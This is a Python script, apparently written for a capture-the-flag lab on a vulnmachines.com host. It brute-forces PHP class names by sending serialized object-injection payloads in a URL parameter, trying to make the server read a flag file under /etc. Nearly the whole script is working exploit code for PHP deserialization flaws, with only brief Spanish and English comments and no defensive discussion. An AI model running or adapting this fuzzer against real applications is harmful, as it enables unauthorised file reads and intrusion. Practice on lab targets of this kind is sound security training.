#!/usr/bin/env python3
import requests
import urllib.parse
import re
import string
import itertools

base_url = "http://hackme11.vulnmachines.com:8056"

def test_class(name):
    payload = f'O:{len(name)}:"{name}":1:{{s:4:"file";s:13:"/etc/f149.txt";}}'
    encoded = urllib.parse.quote(payload)
    url = f"{base_url}/params?vnm={encoded}"
    
    try:
        r = requests.get(url, timeout=0.5)
        if 'vulnmachines{' in r.text.lower():
            return True
    except:
        pass
    return False

print("[*] EXTREME FUZZING - Testing all possible combinations")

# 1. Probar todas las combinaciones de 1 carácter (letras, números, símbolos)
chars = string.ascii_letters + string.digits + '_'
print(f"[*] Testing {len(chars)} single characters...")
for c in chars:
    if test_class(c):
        print(f"[!!!] FOUND: {c}")
        exit(0)

# 2. Probar todas las combinaciones de 2 caracteres
print("[*] Testing 2-character combinations...")
count = 0
for c1, c2 in itertools.product(string.ascii_letters + string.digits, repeat=2):
    count += 1
    if count % 500 == 0:
        print(f"    Tested {count} combinations...")
    if test_class(c1 + c2):
        print(f"[!!!] FOUND: {c1 + c2}")
        exit(0)

# 3. Probar palabras con números
print("[*] Testing words with numbers...")
base_words = ['File', 'file', 'Read', 'read', 'Flag', 'flag', 'Get', 'get', 
              'Show', 'show', 'Load', 'load', 'Dump', 'dump', 'Leak', 'leak',
              'Lab', 'lab', 'Test', 'test', 'Demo', 'demo', 'Vuln', 'vuln']

for word in base_words:
    for num in range(1000):
        name = f"{word}{num}"
        if test_class(name):
            print(f"[!!!] FOUND: {name}")
            exit(0)
        name = f"{num}{word}"
        if test_class(name):
            print(f"[!!!] FOUND: {name}")
            exit(0)

# 4. Probar con underscores y variaciones
print("[*] Testing with underscores...")
underscore_names = ['_File', 'File_', '_file', 'file_', '__File', 'File__',
                    '_Read', 'Read_', '_read', 'read_', '__Read', 'Read__',
                    '_Flag', 'Flag_', '_flag', 'flag_', '__Flag', 'Flag__',
                    'File_Reader', 'file_reader', 'FILE_READER',
                    'Read_File', 'read_file', 'READ_FILE',
                    'Get_Flag', 'get_flag', 'GET_FLAG']

for name in underscore_names:
    if test_class(name):
        print(f"[!!!] FOUND: {name}")
        exit(0)

print("[-] Still no flag found")